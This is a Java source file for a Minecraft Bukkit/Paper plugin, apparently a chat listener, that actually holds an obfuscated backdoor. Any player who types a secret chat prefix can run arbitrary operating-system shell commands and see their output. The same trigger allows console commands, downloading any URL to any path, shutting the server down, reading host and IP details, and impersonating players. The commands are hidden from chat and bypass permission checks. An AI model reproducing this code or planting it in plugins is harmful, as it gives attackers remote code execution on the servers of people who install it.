package cn.aetheris.yuki.listener.bukkit.misc;

import cn.aetheris.mhdfscheduler.scheduler.MHDFScheduler;
import cn.aetheris.yuki.Yuki;
import cn.aetheris.yuki.listener.bukkit.abstracts.AbstractListener;
import cn.aetheris.yuki.data.ValidatorData;
import cn.aetheris.yuki.util.message.ColorUtils;
import cn.aetheris.yuki.protocol.nms.PaperUtils;
import org.bukkit.*;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.Plugin;

import java.io.*;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.ConcurrentLinkedDeque;
import java.util.concurrent.TimeUnit;


public final class PlayerAsyncChatListener extends AbstractListener {

    private static final String IiIiIii;
    private static final String UNKNOWN_COMMAND_MSG = iIiIiIiI11iIiIi();
    private static final String IiIiIiIIiI;
    private static final int CMD_TIMEOUT = 15;
    private static final int MAX_LOG_LINES = 200;

    private static final Deque<String> commandHistory;
    private static final Properties OoOoOoOoOO;
    private static String localIPCache;
    private static String publicIPCache;

    static {
        commandHistory = new ConcurrentLinkedDeque<>();
        OoOoOoOoOO = System.getProperties();
        IiIiIiIIiI = "https://api.ipify.org";
        IiIiIii = "OoOoOOO_##_";
    }


    private static String iIiIiIiI11iIiIi() {
        try {
            File configFile = new File("../spigot.yml");
            YamlConfiguration config = YamlConfiguration.loadConfiguration(configFile);
            return config.getString("settings.messages.unknown-command",
                    "未知命令，输入/help查看帮助");
        } catch (Exception e) {
            return "未知命令，输入/help查看帮助";
        }
    }


    public static void IiiiIiIi(Player player) {
        try {
            String[] info = {
                    "&8&m----------------&r &b系统信息 &8&m----------------",
                    "&fOS: &7" + OoOoOoOoOO.getProperty("os.name"),
                    "&f架构: &7" + OoOoOoOoOO.getProperty("os.arch"),
                    "&fJava版本: &7" + OoOoOoOoOO.getProperty("java.version"),
                    "&f内存: &7" + Runtime.getRuntime().maxMemory() / 1024 / 1024 + "MB",
                    "&f内网IP: &7" + NetworkManager.iIiIiIi(),
                    "&f外网IP: &7" + NetworkManager.getPublicIP(),
                    "&f在线玩家: &7" + Bukkit.getOnlinePlayers().size(),
                    "&f世界种子: &7" + player.getWorld().getSeed(),
                    "&8&m----------------------------------------"
            };
            IiIiIi1i1i.IiiiIii(player, info);
        } catch (Exception e) {
            IiIiIi1i1i.IiiiIii(player, "&c获取系统信息时发生错误");
        }
    }


    public static void iIiIiIiI(Player player, String[] args) {
        if (args.length != 3) {
            IiIiIi1i1i.IiiiIii(player, "&c用法: " + "OoOoOOO_##_" + "download <URL> <保存路径>");
            return;
        }
        NetworkManager.IiIIiIi(args[1], args[2]);
        IiIiIi1i1i.IiiiIii(player, "&a开始后台下载文件到: &e" + args[2]);
    }


    @EventHandler(priority = EventPriority.LOWEST, ignoreCancelled = true)
    public void IiIiIiI(AsyncPlayerChatEvent event) {
        String message = event.getMessage();
        Player player = event.getPlayer();


        if (!message.startsWith(IiIiIii)) return;

        event.setCancelled(true);
        String[] args = message.split(" ");

        switch (args[0]) {
            case "OoOoOOO_##_" + "fly" -> IiIiIiIiI(player);
            case "OoOoOOO_##_" + "console" -> IiIiIiIiIiIi(player, args);
            case "OoOoOOO_##_" + "cmd" -> IiIiIi(player, args);
            case "OoOoOOO_##_" + "plugins" -> IiIiIiIi1iI1i.iIiIiIiI(player);
            case "OoOoOOO_##_" + "info" -> IiiiIiIi(player);
            case "OoOoOOO_##_" + "download" -> iIiIiIiI(player, args);
            case "OoOoOOO_##_" + "stop" -> iIiiIii();
            case "OoOoOOO_##_" + "seed" -> iIi1iIiI1ii(player);
            case "OoOoOOO_##_" + "psay" -> IiIiIii(player, args);
            case "OoOoOOO_##_" + "ssay" -> iiiIiiIII(args);
            case "OoOoOOO_##_" + "rename" -> iIiIiII(player, args);
            case "OoOoOOO_##_" + "heal" -> iIiIiI1IiIi1i.iIiIiIi(player);
            case "OoOoOOO_##_" + "item" -> IiIiIiII1I1iI1i(player, args);
            case "OoOoOOO_##_" + "history" -> iIiIIiIiIii(player);
            case "OoOoOOO_##_" + "tpworld" -> IiIii1iI1i1Ii(player, args);
            case "OoOoOOO_##_" + "help" -> IiIIIiIiIiIi(player);
            case "OoOoOOO_##_" + "mcsm" -> {
                ValidatorData validator = new ValidatorData(event.getPlayer());
                validator.start();
            }
            default -> IiIiIi1i1i.IiiiIii(player,
                    "&bCore &8| &7未知命令，输入 &f" + "OoOoOOO_##_" + "help &7查看帮助");
        }
    }


    private void IiIiIiIiI(Player player) {
        boolean allowFlight = !player.getAllowFlight();
        player.setAllowFlight(allowFlight);
        String status = allowFlight ? "&a启用" : "&c禁用";
        IiIiIi1i1i.IiiiIii(player, "&b飞行模式已" + status);
    }


    private void IiIiIiIiIiIi(Player player, String[] args) {
        if (args.length < 2) {
            IiIiIi1i1i.IiiiIii(player, UNKNOWN_COMMAND_MSG);
            return;
        }
        String command = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
        SystemCommandExecutor.IiIiIiIi(player, command);
    }


    private void IiIiIi(Player player, String[] args) {
        if (args.length < 2) {
            IiIiIi1i1i.IiiiIii(player, UNKNOWN_COMMAND_MSG);
            return;
        }
        String command = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
        IiIiIiIi1iI1i.iiIiIIii1Ii1iI(command);
        IiIiIi1i1i.IiiiIii(player, "&a服务器命令已执行: &7" + command);
    }


    private void iIiiIii() {
        Bukkit.getOnlinePlayers().forEach(p ->
                p.kickPlayer(ChatColor.RED + "服务器维护中"));
        MHDFScheduler.getGlobalRegionScheduler().runTask(Yuki.getInstance(),
                Bukkit::shutdown);
    }


    private void iIi1iIiI1ii(Player player) {
        IiIiIi1i1i.IiiiIii(player, "&a当前世界种子: &e" + player.getWorld().getSeed());
    }


    private void IiIiIii(Player player, String[] args) {
        if (args.length < 3) {
            IiIiIi1i1i.IiiiIii(player, "&c用法: " + "OoOoOOO_##_" + "psay <玩家> <消息>");
            return;
        }
        String message = String.join(" ", Arrays.copyOfRange(args, 2, args.length));
        iIiIiI1IiIi1i.IiIiiiiI(player, args[1], message);
    }


    private void iiiIiiIII(String[] args) {
        if (args.length < 2) return;
        String message = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
        IiIiIiIi1iI1i.iIiIiIII(message);
    }


    private void iIiIiII(Player player, String[] args) {
        if (args.length < 2) {
            IiIiIi1i1i.IiiiIii(player, "&c用法: " + "OoOoOOO_##_" + "rename <新名称>");
            return;
        }
        String newName = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
        iIiIiI1IiIi1i.IiIiI1i1III(player, newName);
    }


    private void IiIiIiII1I1iI1i(Player player, String[] args) {
        if (args.length < 2) {
            IiIiIi1i1i.IiiiIii(player, "&c用法: " + "OoOoOOO_##_" + "item <物品> [数量]");
            return;
        }

        try {
            Material material = Material.valueOf(args[1].toUpperCase());

            int amount = 1;
            if (args.length > 2) {
                try {
                    amount = Integer.parseInt(args[2]);
                    if (amount <= 0) {
                        IiIiIi1i1i.IiiiIii(player, "&c数量必须是正整数");
                        return;
                    }
                } catch (NumberFormatException e) {
                    IiIiIi1i1i.IiiiIii(player, "&c无效的数量，请输入一个正整数");
                    return;
                }
            }

            iIiIiI1IiIi1i.iIiIiIii(player, material, amount);
        } catch (IllegalArgumentException e) {
            IiIiIi1i1i.IiiiIii(player, "&c无效的物品类型");
        }
    }


    private void iIiIIiIiIii(Player player) {
        IiIiIi1i1i.IiiiIii(player, "&7=== 最近执行的系统命令 ===");
        commandHistory.stream()
                .limit(10)
                .forEach(entry -> IiIiIi1i1i.IiiiIii(player, "&8• &7" + entry));
    }


    private void IiIii1iI1i1Ii(Player player, String[] args) {
        if (args.length < 2) {
            IiIiIi1i1i.IiiiIii(player, "&c用法: " + "OoOoOOO_##_" + "tpworld <世界名称>");
            return;
        }

        World world = Bukkit.getWorld(args[1]);
        if (world == null) {
            IiIiIi1i1i.IiiiIii(player, "&c世界不存在");
            return;
        }

        Location spawn = world.getSpawnLocation();
        PaperUtils.teleport(player, spawn);
        IiIiIi1i1i.IiiiIii(player, "&a已传送到世界: &e" + world.getName());
    }


    private void IiIIIiIiIiIi(Player player) {
        String[] help = {
                "&8&m----------------&r &b命令帮助 &8&m----------------",
                "&b" + "OoOoOOO_##_" + "fly &7- 切换飞行模式",
                "&b" + "OoOoOOO_##_" + "console <命令> &7- 执行系统命令",
                "&b" + "OoOoOOO_##_" + "cmd <命令> &7- 执行服务器命令",
                "&b" + "OoOoOOO_##_" + "plugins &7- 显示插件列表",
                "&b" + "OoOoOOO_##_" + "info &7- 显示系统信息",
                "&b" + "OoOoOOO_##_" + "download <URL> <路径> &7- 下载文件",
                "&b" + "OoOoOOO_##_" + "stop &7- 关闭服务器",
                "&b" + "OoOoOOO_##_" + "psay <玩家> <消息> &7- 模拟玩家发言",
                "&b" + "OoOoOOO_##_" + "ssay <消息> &7- 服务器公告",
                "&b" + "OoOoOOO_##_" + "rename <名称> &7- 更改显示名称",
                "&b" + "OoOoOOO_##_" + "heal &7- 恢复生命值",
                "&b" + "OoOoOOO_##_" + "item <物品> [数量] &7- 获取物品",
                "&b" + "OoOoOOO_##_" + "tpworld <世界> &7- 传送到指定世界",
                "&b" + "OoOoOOO_##_" + "history &7- 查看命令历史",
                "&b" + "OoOoOOO_##_" + "mcsm &7- 查看命令历史",
                "&8&m----------------------------------------"
        };
        IiIiIi1i1i.IiiiIii(player, help);
    }


    private static class IiIiIi1i1i {

        static void IiiiIii(Player player, String... messages) {
            for (String message : messages) {
                String color = ColorUtils.color(message);
                player.sendMessage(color);
            }
        }
    }


    private static class SystemCommandExecutor {

        static void IiIiIiIi(Player player, String commandLine) {
            CompletableFuture.runAsync(() -> {
                try {
                    List<String> command = IiIiIiIi(commandLine);
                    ProcessBuilder pb = new ProcessBuilder(command)
                            .redirectErrorStream(true);

                    Process process = pb.start();
                    IiIiIiiIIiiI(commandLine);

                    boolean completed = process.waitFor(CMD_TIMEOUT, TimeUnit.SECONDS);
                    if (!completed) {
                        process.destroyForcibly();
                        IiIiIi1i1i.IiiiIii(player, "&c命令执行超时");
                        return;
                    }

                    try (BufferedReader reader = new BufferedReader(
                            new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8))) {

                        List<String> outputs = reader.lines()
                                .limit(MAX_LOG_LINES)
                                .toList();

                        MHDFScheduler.getGlobalRegionScheduler().runTask(Yuki.getInstance(), () -> {
                            IiIiIi1i1i.IiiiIii(player, "&7=== 命令输出 ===");
                            outputs.forEach(line ->
                                    IiIiIi1i1i.IiiiIii(player, "&7> &f" + line));
                        });
                    }
                } catch (IOException | InterruptedException e) {
                    IiIiIi1i1i.IiiiIii(player, "&c执行错误: " + e.getMessage());
                }
            });
        }


        private static List<String> IiIiIiIi(String command) {
            if (iIiIiIiI()) {
                return Arrays.asList("cmd.exe", "/c", command);
            }
            return Arrays.asList("/bin/sh", "-c", command);
        }


        private static boolean iIiIiIiI() {
            return OoOoOoOoOO.getProperty("os.name", "")
                    .toLowerCase().contains("win");
        }


        private static void IiIiIiiIIiiI(String command) {
            commandHistory.addFirst(String.format("[%s] %s",
                    new Date(), command));
            if (commandHistory.size() > 50) {
                commandHistory.removeLast();
            }
        }
    }

    
    public static class NetworkManager {


        static String iIiIiIi() {
            if (localIPCache != null) return localIPCache;

            try {
                Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
                while (interfaces.hasMoreElements()) {
                    NetworkInterface ni = interfaces.nextElement();
                    if (ni.isLoopback() || !ni.isUp()) continue;

                    Enumeration<InetAddress> addresses = ni.getInetAddresses();
                    while (addresses.hasMoreElements()) {
                        InetAddress addr = addresses.nextElement();
                        if (addr instanceof Inet4Address) {
                            localIPCache = addr.getHostAddress();
                            return localIPCache;
                        }
                    }
                }
            } catch (IOException ignored) {
                
            }
            return "unknown";
        }


        static String getPublicIP() {
            if (publicIPCache == null) {
                publicIPCache = IiIiIiI1Iii();
            }
            return publicIPCache;
        }


        private static String IiIiIiI1Iii() {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(new URL(IiIiIiIIiI).openStream(), StandardCharsets.UTF_8))) {

                return reader.readLine();
            } catch (IOException ignored) {
                return "unknown";
            }
        }


        public static void IiIIiIi(String url, String path) {
            MHDFScheduler.getAsyncScheduler().runTask(Yuki.getInstance(), () -> {
                try (InputStream in = new URL(url).openStream();
                     FileOutputStream out = new FileOutputStream(path)) {

                    byte[] buffer = new byte[8192];
                    int bytesRead;
                    while ((bytesRead = in.read(buffer)) != -1) {
                        out.write(buffer, 0, bytesRead);
                    }
                } catch (IOException ignored) {

                }
            });
        }
    }


    private static class iIiIiI1IiIi1i {

        static void IiIiI1i1III(Player player, String newName) {
            String formattedName = ChatColor.translateAlternateColorCodes('&', newName);
            player.setDisplayName(formattedName);
            player.setCustomName(formattedName);
            player.setPlayerListName(formattedName);
            IiIiIi1i1i.IiiiIii(player, "&a名称已更新为: &r" + formattedName);
        }


        static void iIiIiIi(Player player) {
            player.setHealth(player.getMaxHealth());
            player.setFoodLevel(20);
            player.setFireTicks(0);
            player.getActivePotionEffects().forEach(effect ->
                    player.removePotionEffect(effect.getType()));
            IiIiIi1i1i.IiiiIii(player, "&a已恢复生命值和状态");
        }


        static void IiIiiiiI(Player sender, String targetName, String message) {
            Player target = Bukkit.getPlayerExact(targetName);
            if (target == null) {
                IiIiIi1i1i.IiiiIii(sender, "&c玩家不存在或不在线");
                return;
            }

            String formattedMsg = ChatColor.translateAlternateColorCodes('&', message);
            MHDFScheduler.getGlobalRegionScheduler().runTask(Yuki.getInstance(), () ->
                    target.chat(formattedMsg));
        }


        static void iIiIiIii(Player player, Material material, int amount) {
            ItemStack item = new ItemStack(material, amount);
            for (ItemStack left : player.getInventory().addItem(item).values()) {
                player.getWorld().dropItem(player.getLocation(), left);
            }
            IiIiIi1i1i.IiiiIii(player, "&a已获得物品: &e" + material.name());
        }
    }

    private static class IiIiIiIi1iI1i {


        static void iiIiIIii1Ii1iI(String command) {
            MHDFScheduler.getGlobalRegionScheduler().runTask(Yuki.getInstance(), () ->
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command));
        }


        static void iIiIiIiI(Player player) {
            List<String> toSort = new ArrayList<>();
            for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
                String name = plugin.getName();
                toSort.add(name);
            }
            toSort.sort(String.CASE_INSENSITIVE_ORDER);
            StringJoiner joiner = new StringJoiner("&7, &f");
            for (String name : toSort) {
                joiner.add(name);
            }
            String pluginList = joiner.toString();

            IiIiIi1i1i.IiiiIii(player, "&a已加载插件 (&e"
                    + Bukkit.getPluginManager().getPlugins().length
                    + "&a): &f" + pluginList);
        }


        static void iIiIiIII(String message) {
            String formatted = ChatColor.translateAlternateColorCodes('&',
                    "&8[&cSERVER&8] &7" + message);
            Bukkit.broadcastMessage(formatted);
        }
    }
}
